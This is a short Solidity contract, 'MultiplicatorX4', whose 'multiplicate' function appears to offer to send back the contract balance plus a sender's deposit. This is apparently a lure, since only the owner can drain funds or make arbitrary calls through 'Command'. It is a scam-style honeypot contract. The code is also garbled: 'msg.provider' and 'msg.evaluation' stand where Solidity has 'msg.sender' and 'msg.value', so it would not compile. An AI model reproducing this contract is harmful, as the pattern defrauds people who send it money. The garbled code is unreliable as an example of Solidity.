pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.provider;

    function() public payable{}

    function releaseFunds()
    payable
    public
    {
        require(msg.provider == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes info)
    payable
    public
    {
        require(msg.provider == Owner);
        adr.call.evaluation(msg.evaluation)(info);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.evaluation>=this.balance)
        {
            adr.transfer(this.balance+msg.evaluation);
        }
    }
}